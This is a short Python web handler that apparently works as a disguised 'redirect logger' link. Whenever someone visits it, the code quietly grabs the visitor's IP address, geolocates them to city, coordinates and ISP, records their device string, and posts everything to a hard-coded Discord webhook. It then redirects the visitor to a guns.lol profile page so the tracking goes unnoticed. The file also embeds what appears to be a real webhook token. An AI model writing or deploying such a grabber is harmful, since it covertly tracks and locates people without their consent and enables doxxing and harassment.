from http.server import BaseHTTPRequestHandler
import requests
import json

# Replace with your actual Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1471709365064171624/1Do6JPAWJ-EQ5RipNP9bIGrX2lcTv0rdNs7O-Mi2iTYsS96UTiW9fL40Rd0CHpdpvitW"
# Your profile link
REDIRECT_URL = "https://guns.lol/sleezyyyyyy"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 1. Get the IP
        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
        
        # 2. Get the Location/Coordinate Data
        try:
            geo = requests.get(f"http://ip-api.com/json/{ip}").json()
            city = geo.get('city', 'Unknown')
            region = geo.get('regionName', 'Unknown')
            country = geo.get('country', 'Unknown')
            coords = f"{geo.get('lat', '0')}, {geo.get('lon', '0')}"
            isp = geo.get('isp', 'Unknown')
        except:
            city = region = country = coords = isp = "Error Fetching"

        # 3. Build the fancy Discord Message
        data = {
            "embeds": [{
                "title": "🎯 New Visitor Located!",
                "color": 16711680,
                "fields": [
                    {"name": "🌐 IP Address", "value": ip, "inline": True},
                    {"name": "📍 Location", "value": f"{city}, {region}, {country}", "inline": True},
                    {"name": "🗺️ Coordinates", "value": coords, "inline": False},
                    {"name": "🏢 Provider/ISP", "value": isp, "inline": False},
                    {"name": "📱 Device", "value": self.headers.get('User-Agent', 'Unknown'), "inline": False}
                ],
                "footer": {"text": "Guns.lol Redirect Logger"}
            }]
        }

        # 4. Send to Discord & Redirect
        requests.post(WEBHOOK_URL, json=data)
        self.send_response(302)
        self.send_header('Location', REDIRECT_URL)
        self.end_headers()
